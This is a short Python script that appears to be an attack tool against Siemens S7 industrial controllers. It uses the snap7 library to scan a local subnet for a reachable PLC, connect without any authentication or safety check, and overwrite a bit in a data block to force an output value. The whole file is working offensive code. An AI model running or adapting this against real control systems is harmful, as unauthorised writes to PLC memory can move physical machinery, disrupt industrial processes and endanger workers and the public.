import snap7
import socket
import struct
import time

def find_plc_ip(subnet):
    """
    Scans the network within a specified subnet to detect devices running Siemens S7.
    Returns the PLC's IP if found.
    """
    print("[*] Scanning for Siemens S7 PLC on subnet:", subnet)
    
    for i in range(1, 255):  # Scanning typical IP range x.x.x.1 to x.x.x.254
        ip = f"{subnet}.{i}"
        try:
            client = snap7.client.Client()
            client.connect(ip, 0, 1)  # Attempt connection (Rack=0, Slot=1)
            
            if client.get_connected():
                print(f"[+] PLC detected at {ip}")
                client.disconnect()
                return ip
        except:
            pass  # Ignore connection failures

    print("[!] No PLC found in the subnet.")
    return None


def manipulate_output(plc_ip, db_number, byte_index, bit_index, force_value=True):
    """
    Modifies the I/O image table to force an output bit to a specific value.
    """
    print(f"[*] Connecting to PLC at {plc_ip}...")
    client = snap7.client.Client()
    client.connect(plc_ip, 0, 1)
    
    if not client.get_connected():
        print("[!] Failed to connect to PLC.")
        return
    
    print("[+] Connected to PLC. Manipulating I/O image...")
    
    # Read Output Byte Table
    outputs = client.db_read(db_number, byte_index, 1)
    original_byte = outputs[0]
    
    # Set the desired bit within the byte
    if force_value:
        modified_byte = original_byte | (1 << bit_index)  # Set bit
    else:
        modified_byte = original_byte & ~(1 << bit_index)  # Clear bit
    
    # Write back manipulated data to the PLC
    outputs = bytearray([modified_byte])
    client.db_write(db_number, byte_index, outputs)
    
    print(f"[+] Modified Output byte {byte_index}, bit {bit_index} to {force_value}.")

    client.disconnect()


if __name__ == "__main__":
    subnet = "192.168.1"  # Modify based on your network
    plc_ip = find_plc_ip(subnet)

    if plc_ip:
        manipulate_output(plc_ip, db_number=1, byte_index=0, bit_index=0, force_value=True)